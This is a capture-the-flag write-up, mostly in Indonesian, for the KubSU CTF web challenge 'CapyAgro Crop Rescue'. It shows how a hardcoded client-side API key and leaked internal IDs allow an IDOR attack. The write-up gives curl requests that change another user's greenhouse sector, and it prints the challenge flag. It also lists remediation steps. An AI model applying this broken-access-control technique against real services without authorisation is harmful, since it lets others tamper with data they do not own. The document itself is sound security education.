# CTF Writeup — CapyAgro Crop Rescue

**Event:** KubSU CTF  
**Category:** Web  
**Difficulty:** Easy  
**Flag:** `KubSTU(Sav3d_th3_CapyArg0S3ct0r)`

---

## Challenge Description

> In experimental greenhouse No. 3 on the territory of CapyAgro, the control system has failed. Staff engineers cannot access the control panel. Plants are dying. As external auditors, you need to find a way to regain control of the system and return the parameters to normal.

**URL:** `http://45.146.165.92`

Mirror:
- `http://155.212.186.67`
- `http://62.113.103.24`

---

## Reconnaissance

### Step 1 — Inspect the Frontend Assets

Halaman utama menampilkan aplikasi Flask sederhana dengan fitur login dan register. File JavaScript publik di `/static/config.js` langsung membocorkan konfigurasi API:

```javascript
window.API_CONFIG = {
    KEY: 'test_key_123',
    ENDPOINT: '/api',
    ENDPOINTS: {
        sector: (id) => `/api/sector/${id}`,
        sectorStatus: (number) => `/api/v1/sectors/${number}/status`,
        adjustSector: (id) => `/api/sector/${id}/adjust`,
        rawCommand: '/api/v1/raw_command'
    }
};
```

Dari sini langsung terlihat:
- ada API key hardcoded di sisi client: `test_key_123`
- ada endpoint untuk melihat dan mengubah sektor
- ada endpoint low-level `raw_command`, walau akhirnya tidak diperlukan

### Step 2 — Register and Log In

Setelah membuat akun biasa dan login, aplikasi mengarahkan user ke `/dashboard`. Dashboard ini menampilkan sektor milik user, tetapi JavaScript halaman tersebut juga memperlihatkan bahwa setiap operasi memakai ID numerik internal:

```html
<form onsubmit="adjustSector(event, 57)">
<form onsubmit="adjustSector(event, 58)">
<form onsubmit="adjustSector(event, 59)">
```

Ini menarik karena ID yang dipakai backend bukan sekadar nomor sektor 1, 2, 3, melainkan primary key internal.

### Step 3 — Check CapyAgro Monitoring

Halaman `/capyagro` bisa diakses oleh user biasa dan mengklaim bahwa aksesnya hanya untuk monitoring. Di sana ada petunjuk penting bahwa ID internal bisa dipakai langsung ke endpoint adjust:

```html
<p><em>Используйте эти ID для управления через API /api/sector/{id}/adjust</em></p>
```

Selain itu ada endpoint yang membocorkan daftar sektor CapyAgro:

```bash
curl -s http://45.146.165.92/api/capyagro/sectors \
  -H 'X-API-Key: test_key_123' \
  -b 'session=<logged-in-session>'
```

Contoh respons:

```json
{
  "sectors": [
    {
      "humidity": 45.0,
      "id": 70,
      "last_update": "2026-05-01 07:10:29",
      "sector_number": 4,
      "status": false,
      "temp": 30.0
    }
  ]
}
```

Respons ini membocorkan semua yang diperlukan:
- sektor CapyAgro yang rusak adalah `sector_number: 4`
- ID internal yang bisa dimodifikasi adalah `id: 70`
- nilai saat ini berada di luar ambang aman: `temp=30`, `humidity=45`

---

## Exploitation

### Step 4 — Test the Adjust Endpoint Against CapyAgro Sector

Bug utamanya adalah endpoint penyesuaian tidak membatasi kepemilikan sektor. User biasa tetap bisa mengubah sektor CapyAgro selama mengetahui ID internalnya.

Request eksploit:

```bash
curl -s http://45.146.165.92/api/sector/70/adjust \
  -X POST \
  -H 'Content-Type: application/json' \
  -H 'X-API-Key: test_key_123' \
  -b 'session=<logged-in-session>' \
  -d '{"temp":24,"humidity":60}'
```

Nilai `24` dan `60` dipilih karena berada di rentang aman yang terlihat konsisten dari dashboard sektor normal.

Response:

```json
{
  "all_capyagro_saved": true,
  "flag": "KubSTU(Sav3d_th3_CapyArg0S3ct0r)",
  "message": "Все сектора CapyAgro восстановлены! Урожай спасён!",
  "sector": {
    "humidity": 60.0,
    "id": 70,
    "is_capyagro": true,
    "sector_number": 4,
    "temp": 24.0
  },
  "success": true
}
```

Di titik ini flag langsung diberikan oleh backend.

---

## Flag

```text
KubSTU(Sav3d_th3_CapyArg0S3ct0r)
```

---

## Vulnerability Summary

| # | Vulnerability | Detail |
|---|---|---|
| 1 | **Client-Side Secret Exposure** | API key `test_key_123` ditanam langsung di file JavaScript publik |
| 2 | **IDOR / Broken Access Control** | User biasa bisa membaca ID internal sektor CapyAgro lalu memanggil endpoint adjust untuk sektor yang bukan miliknya |
| 3 | **Business Logic Flaw** | Endpoint monitoring yang seharusnya read-only malah membocorkan ID yang bisa langsung dipakai untuk write action |

---

## Remediation

1. **Jangan simpan API key di frontend** — pindahkan autentikasi sensitif ke server-side
2. **Terapkan ownership check di backend** — `/api/sector/<id>/adjust` harus memastikan sektor benar-benar dimiliki user yang sedang login
3. **Pisahkan endpoint monitoring dan kontrol** — data monitoring tidak boleh membocorkan identifier internal yang bisa dipakai untuk operasi tulis
4. **Gunakan identifier publik yang aman** — jangan ekspos primary key internal tanpa lapisan otorisasi

---

## Tools Used

- `curl` — verifikasi request dan response HTTP
- Python `requests` — otomasi register, login, enumerasi, dan eksploit

---

## Attack Flow

```text
Open main page
      |
      v
Read /static/config.js
  -> find API key: test_key_123
  -> find interesting endpoints
      |
      v
Register and login as normal user
      |
      v
Open /capyagro and query /api/capyagro/sectors
  -> leak internal sector ID for CapyAgro
      |
      v
POST /api/sector/<internal_id>/adjust
  with safe values temp=24 humidity=60
      |
      v
Backend marks CapyAgro sector as restored
      |
      v
Flag returned in JSON response
```
